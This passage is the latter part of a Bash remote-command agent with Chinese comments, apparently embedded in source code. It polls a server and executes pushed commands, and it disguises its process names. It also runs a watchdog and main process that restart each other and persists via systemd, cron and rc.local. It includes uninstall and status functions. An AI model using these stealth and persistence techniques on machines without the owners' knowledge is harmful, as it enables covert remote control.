                    [ "$cid" = "$line" ] && continue
                    execute_command "$cid" "$b64"
                done <<< "$lines"
                ;;
            *)
                sleep "$POLL_INTERVAL"
                ;;
        esac
    done
}

# ---------------- 看门狗进程：独立巡检主进程存活状态 ----------------
# 与主进程互守：主进程死了/假死→看门狗拉起；看门狗死了→主进程拉起
do_watchdog() {
    # 伪装进程名
    disguise "$PROC_NAME_WD"
    echo $$ > "$WATCHDOG_PID_FILE" 2>/dev/null

    local main_pid hb_age under_systemd

    # 检测是否运行在 systemd 下（systemd 会自动处理崩溃重启）
    if [ -n "\${NOTIFY_SOCKET:-}" ]; then
        under_systemd=1
    else
        under_systemd=0
    fi

    while true; do
        sleep "$WATCHDOG_CHECK_INTERVAL"

        # 读取主进程 PID
        main_pid=""
        if [ -f "$PID_FILE" ]; then
            main_pid=$(cat "$PID_FILE" 2>/dev/null)
        fi

        # ---------- 情况一：主进程不存在 ----------
        if [ -z "$main_pid" ] || ! kill -0 "$main_pid" 2>/dev/null; then
            if [ "$under_systemd" -eq 1 ]; then
                # systemd 模式：让 systemd 自动重启，不干预
                continue
            fi
            # 非 systemd 模式：自行拉起
            warn "主进程不存在，尝试拉起..."
            rm -f "$LOCK_FILE" 2>/dev/null
            self_heal && spawn_main
            sleep 3
            continue
        fi

        # ---------- 情况二：主进程假死（心跳超时） ----------
        hb_age=$(heartbeat_age)
        if [ "$hb_age" -gt "$WATCHDOG_TIMEOUT" ]; then
            warn "主进程假死（\${hb_age}s 无心跳），强制重启..."
            kill -9 "$main_pid" 2>/dev/null
            sleep 1
            rm -f "$PID_FILE" "$LOCK_FILE" 2>/dev/null
            if [ "$under_systemd" -eq 1 ]; then
                # systemd 模式：杀掉假死进程后 systemd 会自动重启
                # 看门狗自身也退出，让 systemd 通过 cgroup 统一清理并重启
                rm -f "$WATCHDOG_PID_FILE" 2>/dev/null
                exit 0
            fi
            # 非 systemd 模式：自行拉起
            self_heal && spawn_main
            sleep 3
            continue
        fi

        # ---------- 情况三：脚本文件自愈 ----------
        if [ ! -s "$AGENT_FILE" ]; then
            warn "检测到 Agent 脚本缺失，执行自愈..."
            self_heal
        fi
    done
}

# ---------------- 主运行循环：单实例锁 + 双进程互守 + 内层轮询 ----------------
do_run() {
    # 伪装进程名
    disguise "$PROC_NAME_MAIN"

    # 单实例锁：确保全局只有一个 --run 进程
    if ! acquire_lock; then
        exit 0
    fi

    # 优雅退出信号处理
    trap on_signal TERM INT

    local agent_id hostname ip agent_token

    agent_id=$(get_agent_id)
    if [ -z "$agent_id" ]; then
        err "未找到 Agent ID，尝试重新注册..."
        do_register
        agent_id=$(get_agent_id)
        [ -z "$agent_id" ] && die "注册失败，无法运行"
    fi

    agent_token=$(get_agent_token)

    hostname=$(hostname 2>/dev/null || echo "")
    # 获取公网 IP（带缓存，避免内网/公网来回切换）
    ip=$(get_public_ip)
    # 采集系统信息（每次启动时采集一次，checkin 时刷新）
    sys_info=$(collect_sys_info)

    log "Agent 已启动（PID $$），开始流式通信（实时命令推送）"

    # 看门狗：仅非 systemd 模式下启动（systemd 下由 Restart=always 处理崩溃恢复）
    if [ -z "\${NOTIFY_SOCKET:-}" ]; then
        spawn_watchdog
    fi

    # 写入初始心跳
    write_heartbeat

    # 外层保活循环：内层异常退出后重新注册并继续
    while [ "$RUNNING" -eq 1 ]; do
        inner_loop "$agent_id" "$hostname" "$ip" "$agent_token" "$sys_info" || {
            [ "$RUNNING" -ne 1 ] && break
            warn "与服务端通信异常，尝试重新注册..."
            do_register
            agent_id=$(get_agent_id)
            # 重新采集系统信息
            sys_info=$(collect_sys_info)
            sleep 5
        }
        # 检查看门狗健康
        check_watchdog
        # 写心跳
        write_heartbeat
        # 定期刷新系统信息（每次重连时刷新）
        sys_info=$(collect_sys_info)
        [ "$RUNNING" -eq 1 ] && sleep "$POLL_INTERVAL"
    done

    # 通知 systemd 即将停止，清理文件
    sd_notify --stopping
    rm -f "$PID_FILE" "$HEARTBEAT_FILE" 2>/dev/null
    log "Agent 已停止"
    exit 0
}

# ---------------- 卸载 ----------------
do_uninstall() {
    check_root
    log "卸载被控端 Agent..."

    # 停止并移除 systemd 服务
    if [ -f "/etc/systemd/system/\${SERVICE_NAME}.service" ]; then
        systemctl stop "\${SERVICE_NAME}" >/dev/null 2>&1
        systemctl disable "\${SERVICE_NAME}" >/dev/null 2>&1
        rm -f "/etc/systemd/system/\${SERVICE_NAME}.service"
        systemctl daemon-reload >/dev/null 2>&1
    fi

    # 移除 cron 条目
    crontab -l 2>/dev/null | grep -v "\${AGENT_FILE}" | crontab - 2>/dev/null

    # 移除 rc.local 条目
    if [ -f /etc/rc.local ]; then
        sed -i "/\${AGENT_FILE}/d" /etc/rc.local 2>/dev/null
    fi

    # 杀死主进程和看门狗（优先按 PID 文件）
    local pid
    if [ -f "$PID_FILE" ]; then
        pid=$(cat "$PID_FILE" 2>/dev/null)
        [ -n "$pid" ] && kill -9 "$pid" 2>/dev/null
    fi
    if [ -f "$WATCHDOG_PID_FILE" ]; then
        pid=$(cat "$WATCHDOG_PID_FILE" 2>/dev/null)
        [ -n "$pid" ] && kill -9 "$pid" 2>/dev/null
    fi
    # 兜底：用 pgrep -x 精确匹配 comm 名（非正则），避免误杀其他进程
    for comm_name in "$PROC_NAME_MAIN" "$PROC_NAME_WD"; do
        for p in $(pgrep -x "$comm_name" 2>/dev/null); do
            kill -9 "$p" 2>/dev/null
        done
    done 2>/dev/null

    # 删除安装目录
    rm -rf "$INSTALL_DIR"

    ok "卸载完成"
}

# ---------------- 状态查看 ----------------
do_status() {
    local agent_id pid

    agent_id=$(get_agent_id)

    echo "========== Agent 状态 =========="
    echo "安装目录:   $INSTALL_DIR"
    echo "Agent 文件: $AGENT_FILE"
    echo "ID 文件:    $ID_FILE"
    if [ -n "$agent_id" ]; then
        echo "Agent ID:   $agent_id"
    else
        echo "Agent ID:   (未注册)"
    fi

    if [ -f "/etc/systemd/system/\${SERVICE_NAME}.service" ]; then
        if systemctl is-active --quiet "\${SERVICE_NAME}" 2>/dev/null; then
            echo "systemd:    运行中"
        else
            echo "systemd:    已安装但未运行"
        fi
    else
        echo "systemd:    未安装"
    fi

    # 主进程状态
    pid=""
    if [ -f "$PID_FILE" ]; then
        pid=$(cat "$PID_FILE" 2>/dev/null)
    fi
    if [ -n "$pid" ] && kill -0 "$pid" 2>/dev/null; then
        echo "主进程:     运行中 (PID $pid)"
    else
        echo "主进程:     未运行"
    fi

    # 看门狗状态（systemd 模式下不启动看门狗，显示"由systemd管理"）
    if [ -n "\${NOTIFY_SOCKET:-}" ]; then
        echo "看门狗:     由systemd管理"
    elif [ -f "$WATCHDOG_PID_FILE" ]; then
        pid=$(cat "$WATCHDOG_PID_FILE" 2>/dev/null)
        if [ -n "$pid" ] && kill -0 "$pid" 2>/dev/null; then
            echo "看门狗:     运行中 (PID $pid)"
        else
            echo "看门狗:     未运行"
        fi
    else
        echo "看门狗:     未运行"
    fi

    # 心跳
    local hb
    hb=$(heartbeat_age)
    if [ "$hb" -lt 999999 ]; then
        echo "心跳:       \${hb}s 前"
    else
        echo "心跳:       无记录"
    fi

    # cron 监视
    if crontab -l 2>/dev/null | grep -q "\${AGENT_FILE}"; then
        echo "cron 监视:  已配置"
    else
        echo "cron 监视:  未配置"
    fi

    # rc.local
    if grep -q "$AGENT_FILE" /etc/rc.local 2>/dev/null; then
        echo "rc.local:   已配置"
    else
        echo "rc.local:   未配置"
    fi
    echo "================================"
}

# ---------------- 入口 ----------------
main() {
    local mode="\${1:---install}"
    case "$mode" in
        --run)            do_run ;;
        --watchdog)       do_watchdog ;;
        --uninstall)      do_uninstall ;;
        --status)         do_status ;;
        --install|*)      do_install ;;
    esac
}

# 在子 shell 中执行，防止 curl|bash 模式下 exit 杀掉 SSH 会话
( main "$@" )
`

